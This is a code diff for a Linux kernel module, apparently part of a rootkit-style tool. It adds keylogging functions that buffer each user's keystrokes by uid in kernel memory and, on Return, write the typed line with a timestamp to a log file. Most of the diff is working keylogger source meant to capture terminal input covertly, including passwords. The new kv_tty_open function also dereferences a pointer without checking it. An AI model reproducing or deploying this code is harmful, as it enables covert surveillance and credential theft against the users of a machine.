@@ -10,17 +10,26 @@
 #include "log.h"
 
 static DEFINE_SPINLOCK(tty_lock);
-static struct file *filp;
 
-bool kv_tty_open(const char *filename) {
-    if (filename != NULL)
-        filp = fs_kernel_open_file(filename);
-
-    prinfo("FILP: %p [%d]\n", filp, filp ? true: false);
-    return filp ? true: false;
+static void _keylog_cleanup_list(struct list_head *head) {
+    struct keylog_t *node, *node_safe;
+    list_for_each_entry_safe(node, node_safe, head, list) {
+        list_del(&node->list);
+        kfree(node);
+        node = NULL;
+    }
 }
 
-void kv_tty_write(uid_t uid, char *buf, ssize_t len) {
+struct file *kv_tty_open(struct file **fp, const char *filename) {
+    if (filename != NULL) {
+		if (fp)
+			*fp = fs_kernel_open_file(filename);
+	}
+
+    return *fp;
+}
+
+void kv_tty_write(struct file *fp, uid_t uid, char *buf, ssize_t len) {
     static loff_t offset;
     struct timespec64 ts;
     long msecs;
@@ -47,14 +56,70 @@ void kv_tty_write(uid_t uid, char *buf, ssize_t len) {
             (long long)ts.tv_sec, msecs, uid, buf);
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
-    fs_kernel_write_file(filp, (const void*)ttybuf, total, &offset);
+    fs_kernel_write_file(fp, (const void*)ttybuf, total, &offset);
 #else
-    fs_kernel_write_file(filp, (const char*)ttybuf, total, offset);
+    fs_kernel_write_file(fp, (const char*)ttybuf, total, offset);
 #endif
     spin_unlock(&tty_lock);
 }
 
-void kv_tty_close(void) {
-    fs_kernel_close_file(filp);
-    filp = NULL;
+int kv_key_add(struct list_head *head, uid_t uid, char byte, int flags) {
+    struct keylog_t *kl;
+    int rv = 0;
+
+    if ((flags & R_RETURN) || (!(flags & R_RANGE)))
+        return rv;
+
+    kl = kcalloc(1, sizeof(struct keylog_t) , GFP_KERNEL);
+    if (!kl) {
+        prerr("Insufficient memory\n");
+        rv = -ENOMEM;
+    } else {
+        kl->offset = 0;
+        kl->buf[kl->offset++] = byte;
+        kl->uid = uid;
+        list_add_tail(&kl->list, head);
+    }
+
+    return rv;
+}
+
+int kv_key_update(struct list_head *head, struct file *fp, uid_t uid, char byte, int flags) {
+    struct keylog_t  *node, *node_safe;
+    bool new = true;
+    int rv = 0;
+
+    list_for_each_entry_safe(node, node_safe, head, list) {
+        if (node->uid != uid) continue;
+
+        if (flags & R_RETURN) {
+            node->buf[node->offset++] = '\n';
+            node->buf[node->offset] = 0;
+
+            kv_tty_write(fp, uid, node->buf, strlen(node->buf));
+
+            list_del(&node->list);
+            kfree(node);
+        } else if((flags & R_RANGE) || (flags & R_NEWLINE)) {
+            if (node->offset < KEY_LOG_BUF_MAX) {
+                node->buf[node->offset++] = byte;
+            }
+            else {
+                prwarn("Warning: max length reached: %d\n", KEY_LOG_BUF_MAX);
+                return -ENOMEM;
+            }
+        }
+        new = false;
+        break;
+    }
+
+    if (new)
+        rv = kv_key_add(head, uid, byte, flags);
+
+    return rv;
+}
+
+
+void kv_tty_close(struct list_head *head) {
+    _keylog_cleanup_list(head);
 }
